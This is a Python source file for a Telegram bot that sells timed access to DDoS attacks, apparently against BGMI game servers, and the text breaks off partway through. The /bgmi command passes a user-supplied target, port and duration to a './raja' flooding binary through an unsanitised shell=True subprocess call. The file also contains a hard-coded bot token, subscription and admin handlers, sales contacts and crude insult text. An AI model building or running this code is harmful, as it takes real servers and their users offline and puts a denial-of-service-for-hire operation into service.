#script by @GODxAloneBOY

import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4')

# Admin user IDs
admin_id = ["1662672529"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["1549748318"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet purchase now from:- @GODxAloneBOY."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @GODxAloneBOY 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @GODxAloneBOY ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @GODxAloneBOY 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @GODxAloneBOY ❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @GODxAloneBOY ❄."
        bot.reply_to(message, response)


def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    # Changing the font style to a different Unicode font
    response = f"{username}, 𝓐𝓣𝓣𝓐𝓒𝓚 𝓢𝓣𝓐𝓡𝓣𝓔𝓓.🔥🔥\n\n𝓣𝓪𝓻𝓰𝓮𝓣: {target}\n𝓟𝓸𝓻𝓣: {port}\n𝓣𝓲𝓶𝓮: {time} 𝓢𝓮𝓬𝓸𝓷𝓭𝓼\n𝓜𝓮𝓣𝓗𝓞𝓓: VIP- User of @RAJOWNER90"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                time_left = COOLDOWN_TIME - (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                response = f"⚠️ 𝒀𝒐𝒖 𝒂𝒓𝒆 𝑜𝒏 𝒄𝑜𝑜𝓁𝒹𝑜𝓌𝓃 ❌. 𝒫𝓁𝑒𝒶𝓈𝑒 𝓌𝒶𝒾𝓉 {time_left} 𝓈𝑒𝒸𝑜𝓃𝒹𝓈 𝒷𝑒𝒻𝑜𝓇𝑒 𝓇𝓊𝓃𝓃𝒾𝓃𝑔 𝒶𝒶𝒶𝒶𝒶 𝒸𝑜𝓶𝒶𝒽𝓉 𝓶𝑒𝑠𝓈𝒶𝑔𝑒"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            try:
                port = int(command[2])  # Convert port to integer
            except ValueError:
                response = "❌ 𝓔𝓻𝓻𝓸𝓻: 𝒫𝑜𝓇𝓉 𝓂𝓊𝓈𝓉 𝒷𝑒 𝒶𝓃 𝒾𝓃𝓉𝑒𝑔𝑒𝓇."
                bot.reply_to(message, response)
                return

            try:
                time = int(command[3])  # Convert time to integer
            except ValueError:
                response = "❌ 𝓔𝓻𝓻𝓸𝓻: 𝒯𝒾𝓂𝑒 𝓂𝓊𝓈𝓉 𝒷𝑒 𝒶𝓃 𝒾𝓃𝓉𝑒𝑔𝑒𝓇."
                bot.reply_to(message, response)
                return

            if port < 1 or port > 65535:
                response = "❌ 𝓔𝓻𝓻𝓸𝓻: 𝒲𝒓𝑜𝓃𝑔 𝒫𝓄𝓇𝓉. 𝒫𝑜𝓇𝓉 𝓂𝓊𝓈𝓉 𝒷𝑒 𝒷𝑒𝓉𝓌𝑒𝑒𝓃 1 𝒶𝓃𝒹 65535."
                bot.reply_to(message, response)
                return

            if time > 120:
                response = "❌ 𝓔𝓻𝓻𝓸𝓻: 𝒯𝒾𝓂𝑒 𝒾𝓃𝓉𝑒𝓇𝓋𝒶𝓁 𝓂𝓊𝓈𝓉 𝒷𝑒 𝓁𝑒𝓈𝓈 𝓉𝒽𝒶𝓃 120 𝓈𝑒𝒸𝑜𝓃𝒹𝓈."
                bot.reply_to(message, response)
                return

            record_command_logs(user_id, '/raja', target, port, time)
            log_command(user_id, target, port, time)
            start_attack_reply(message, target, port, time)  # Call start_attack_reply function

            full_command = f"./raja {target} {port} {time} 150"
            try:
                process = subprocess.run(full_command, shell=True, check=True)
                response = f"🔥 𝓑𝓖𝓜𝓘 𝒜𝓉𝓉𝒶𝒸𝒽 𝒻𝒾𝓃𝒾𝓈𝒽𝑒𝒹. 𝒯𝒶𝓇𝑔𝑒𝓉: {target} 𝒫𝑜𝓇𝓉: {port} 𝒯𝒾𝓂𝑒: {time} 𝓈𝑒𝒸𝑜𝑜𝓁."
            except subprocess.CalledProcessError as e:
                response = f"❌ 𝓔𝓻𝓻𝓸𝓻: 𝒮𝒸𝒾𝓇𝓅𝓉 𝒻𝒶𝒾𝓁𝑒𝒹. 𝒱𝑒𝓇𝒾𝒻𝓎 𝓎𝑜𝓊𝓇 𝒸𝑜𝓂𝒶𝓃𝒹."
            
            bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ 𝒲𝒶𝓍 𝓊𝓈𝑒: /bgmi <𝓉𝒶𝓇𝑔𝑒𝓉> <𝒫𝑜𝓇𝓉> <𝒯𝒾𝓂𝑒>"
    else:
        response = ("🚫 𝒰𝓃𝒶𝓊𝓉𝒽𝑜𝓇𝒾𝓏𝑒𝒹 𝒜𝒸𝒸𝑒𝓈𝓈! 🚫\n\n𝒪𝑜𝓅𝓈! 𝒾𝓉 𝓈𝑒𝑒𝓂𝓈 𝓁𝒾𝒦𝑒 𝓎𝑜𝓊 𝒹𝑜𝓃'𝓉 𝒽𝒶𝓋𝑒 𝓅𝑒𝓇𝓂𝒾𝓈𝓈𝒾𝑜𝓃 𝓉𝑜 𝓊𝓈𝑒 𝓉𝒽𝑒 /bgmi 𝒸𝑜𝓂𝒶𝓃𝒹. 𝒟𝑀 𝒯𝒪 𝒷𝓊𝓎 𝒜𝒸𝒸𝑒𝓈𝓈: @GODxAloneBOY")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🤖 𝑉𝒶𝓁𝒾𝒹 𝒸𝑜𝓂𝓂𝒶𝓃𝒹𝓈:
💥 /bgmi : 𝑀𝑒𝓉𝒽𝑜𝒹 𝐹𝑜𝓇 𝐵𝑔𝓂𝒾 𝒮𝑒𝓇𝓋𝑒𝓇𝓈.
💥 /rules : 𝒫𝓁𝑒𝒶𝓈𝑒 𝒸𝒽𝑒𝒸𝒸 𝒷𝑒𝒻𝑜𝓇𝑒 𝓊𝓈𝑒 !!
💥 /mylogs : 𝒯𝑜 𝒞𝒽𝑒𝒸𝓀 𝒴𝑜𝓊𝓇 𝑅𝑒𝒸𝑒𝓃𝓉 𝒜𝓉𝓉𝒶𝒸𝓀𝓈.
💥 /plan : 𝐶𝒽𝑒𝒸𝒽𝑜𝓊𝓉 𝒪𝓊𝓇 𝐵𝑜𝓉𝓃𝑒𝓉 𝑅𝒶𝓉𝑒𝓈.
💥 /myinfo : 𝒯𝑜 𝒞𝒽𝑒𝒸𝓀 𝒴𝑜𝓊𝓇 𝒲𝐻𝒪𝒲𝒩𝒲𝒾𝑛𝒽𝒾𝒿.

🤖 𝑇𝑜 𝒮𝑒𝑒 𝒜𝒹𝓂𝒾𝓃 𝒸𝑜𝓂𝓂𝒶𝓃𝒹𝓈:
💥 /admincmd : 𝒮𝒽𝑜𝓌𝓈 𝒶𝓁𝓁 𝒜𝒹𝓂𝒾𝓃 𝒸𝑜𝓂𝓂𝒶𝓃𝒹𝓈.

𝐵𝓎 𝐹𝓇𝑜𝓂 :- @GODxAloneBOY
Official 𝒞𝒽𝒶𝓃𝓃𝑒𝓁 :- https://t.me/+03wLVBPurPk2NWRl
'''

    # Adding command list dynamically with VIP font
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            for command in handler.commands:
                # Make sure it’s not an admin command if you want to exclude them
                if 'admin' not in handler.__doc__.lower():
                    # Add commands to the help_text with VIP font
                    help_text += f"\n💥 /{command} : {handler.__doc__ or 'No description available'}"

    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🌟 𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝒢𝒪𝒟𝒳𝒞𝐻𝐸𝒜𝒯𝒟 𝒟𝒟𝒪𝒮 𝒷𝑜𝓉, {user_name}! 🌟

✨ 𝐖𝐞 𝐚𝐫𝐞 𝐡𝐞𝐫𝐞 𝐭𝐨 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐲𝐨𝐮 𝐰𝐢𝐭𝐡 𝐡𝐢𝐠𝐡-𝐪𝐮𝐚𝐥𝐢𝐭𝐲 𝐝𝐝𝐨𝐬 𝐬𝐞𝐫𝐯𝐢𝐜𝐞𝐬 𝐭𝐡𝐚𝐭 𝐚𝐫𝐞 𝐬𝐭𝐚𝐛𝐥𝐞, 𝐬𝐞𝐜𝐮𝐫𝐞 𝐚𝐧𝐝 𝐝𝐞𝐬𝐢𝐠𝐧𝐞𝐝 𝐭𝐨 𝐝𝐨𝐦𝐢𝐧𝐚𝐭𝐞! 💥

🚀 𝑯𝑬𝑹𝑬'𝑺 𝑯𝑶𝑾 𝑻𝒉𝒊𝒔 𝒃𝒐𝒕 𝑴𝑨𝒀 𝑯𝑬𝑙𝑷 𝒀𝒐𝒖:
1️⃣ 𝑻𝒓𝒚 𝒕𝒉𝒆 𝒄𝒐𝒎𝒎𝒶𝑛𝒹 /help 𝒇𝒐𝒓 𝑎 𝒅𝒆𝓉𝒶𝒾𝒻𝒾𝑒𝒹 𝒍𝒊𝓈𝒹 𝑜𝒻 𝒶𝒻𝒻𝑜𝓇𝒹𝒶𝒃𝓁𝑒 𝒸𝑜𝓂𝓂𝒶𝓃𝒹𝓈 𝓎𝑜𝓊 𝒸𝒶𝓃 𝓊𝓈𝑒 𝓌𝒾𝓉𝒽 𝓎𝑜𝓊𝓇 𝑒𝓍𝓉𝓇𝒶 𝓈𝑒𝓇𝓋𝒾𝒸𝑒𝓈.

2️⃣ 𝑬𝒏𝒋𝑜𝓎 𝑃𝒓𝒆𝓂𝒾𝓊𝓂 𝒞𝑜𝓂𝓂𝒶𝓃𝒹𝓈 𝒸𝑜𝓂𝑝𝓁𝑒𝓉𝑒𝓁𝓎 𝒹𝑒𝓈𝒾𝑔𝓃𝑒𝒹 𝒻𝑜𝓇 𝑎 𝒮𝓃𝒶𝓅 𝑆𝑢𝒸𝒸𝑒𝓈𝓈 𝒶𝓃𝒹 𝒶𝒹𝒹 𝒷𝑒𝓈𝓉 𝓏𝒾𝓈𝓏 𝒮𝒾𝑍𝒵 𝒜𝒽𝑒𝒶𝒹.

🔑 𝑹𝑬𝑨𝑫 𝑻𝒉𝒊𝒔: 𝑻𝒉𝒆 𝒔𝒆𝒓𝒗𝒊𝒄𝒆𝓈 𝒐𝒇 𝑮𝒪𝒟𝒳𝒞𝐻𝐸𝒜𝒯𝒟 𝒶𝓇𝑒 𝑒𝓁𝒾𝒶𝒷𝓁𝑒 𝒇𝑜𝓇 𝒶 𝒹𝓎𝓃𝒶𝓂𝒾𝒸 𝒸𝒾𝓉𝒾𝑒𝓈, 𝒷𝓇𝒾𝒿𝓉 𝑠𝑒𝒶𝓂𝑒𝓇𝓎.

🎯 𝑻𝑹𝒀 𝒕𝒉𝒆 /help 𝒄𝒐𝒎𝒎𝒶𝑛𝒹 𝑓𝑜𝓇 𝓂𝑜𝓇𝑒 𝒅𝒆𝓉𝒶𝒾𝓁𝒶𝒹 𝒻𝑒𝒶𝓉𝓊𝓇𝑒𝓈.

⚡ 𝑪𝒐𝓶𝑝𝓁𝑒𝓉𝑒 𝒸𝑜𝓂𝓂𝒶𝓃𝒹𝓈 𝑒𝑥𝒸𝑒𝓁𝓁𝑒𝓃𝒸𝑒 𝓊𝓉𝒾𝓁𝒾𝓏𝑒𝒹.

🛒 𝐵𝓎 𝑓𝓇𝑜𝓂 :- @GODxAloneBOY

🌐 𝑶𝒇𝒇𝒊𝒄𝒊𝒶𝓁 𝒞𝒽𝒶𝓃𝓃𝑒𝓁 :- https://t.me/+03wLVBPurPk2NWRl
'''

    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED https://t.me/+03wLVBPurPk2NWRl OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, laude chutiya
    

__________(▓▓))

_________((▓▓▓))

________(▓▓▓▓▓))

_______(▓▓▓▓▓▓▓))

_______(▓▓▓▓▓▓▓))

_______(▓▓▓▓▓▓▓))

_______(((▓▓▓▓▓))

________((▓▓▓▓))

________(▓▓▓▓)

_______(▓▓▓▓)

______(▓▓▓▓)

_____(▓▓▓▓)

____(▓▓▓▓)

___(▓▓▓▓)

__(▓▓▓▓)

_(▓▓▓▓)

.(▓▓▓▓)

(▓▓▓▓)

(▓▓▓▓)

.(▓▓▓▓)

_(▓▓▓▓)

__(▓▓▓▓)

___(▓▓▓▓)

____(▓▓▓▓)

_____(▓▓▓▓)

______(▓▓▓▓)

_______(▓▓▓▓)

________(▓▓▓▓)

_________(▓▓▓▓)

__________(▓▓▓▓)

___________(▓▓▓▓)

____________(▓▓▓▓)

_____________(▓▓▓▓)

______________(▓▓▓▓)

_______________(▓▓▓▓)

________________(▓▓▓▓)

_________________(▓▓▓▓)

_________________.(▓▓▓▓)

__________________(▓▓▓▓)

__________________(▓▓▓▓)

__________________(▓▓▓▓)

_________________.(▓▓▓▓)

_________________(▓▓▓▓)

________________(▓▓▓▓)

_______________(▓▓▓▓)

______________(▓▓▓▓)

_____________(▓▓▓▓)

TUMKO CHUTIYA BANAYA 😂
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''🌟 𝑾𝑬𝑳𝑪𝑶𝑴𝑬, {user_name}! 𝒜𝒹𝓂𝒾𝓃 𝒞𝑜𝓂𝓂𝒶𝓃𝒹𝓈 𝒶𝓇𝑒 𝒽𝑒𝓇𝑒!! 🌟

💼 𝑇𝒽𝑒 𝒻𝑜𝓁𝓁𝑜𝓌𝒾𝓃𝑔 𝒶𝒹𝓂𝒾𝓃 𝒸𝑜𝓂𝓂𝒶𝓃𝒹𝓈 𝒶𝓇𝑒 𝒶𝓋𝒶𝒾𝓁𝒶𝒷𝓁𝑒 𝒻𝑜𝓇 𝓎𝑜𝓊 𝓉𝑜 𝓂𝒶𝓀𝑒 𝒸𝒽𝒶𝓃𝑔𝑒𝓈:

1️⃣ **/add <userId>** 
   - 🔑 **Usage**: 𝒲𝒾𝓉𝒽 𝒶𝒹𝒹𝒾𝓃𝑔 𝒶 𝓊𝓈𝑒𝓇 𝒷𝓎 𝒾𝒹, 𝓎𝑜𝓊 𝒸𝒶𝓃 𝑒𝓂𝓅𝑜𝓌𝑒𝓇 𝓉𝒽𝑒𝓂 𝒻𝑜𝓇 𝒶𝒸𝒸𝑒𝓈𝓈 𝒶𝓃𝒹 𝒽𝒾𝑔𝒽 𝒻𝓊𝓃𝒸𝓉𝒾𝑜𝓃𝒶𝓁𝒾𝓉𝒾𝑒𝓈.

2️⃣ **/remove <userId>**
   - ❌ **Usage**: 𝑅𝑒𝓂𝑜𝓋𝑒 𝓉𝒽𝑒 𝓊𝓈𝑒𝓇 𝒷𝓎 𝒾𝒹, 𝒶𝓃𝒹 𝓈𝒾𝓂𝓅𝓁𝒾𝒻𝓎 𝒽𝒾𝓈 𝒶𝒸𝒸𝑒𝓈𝓈 
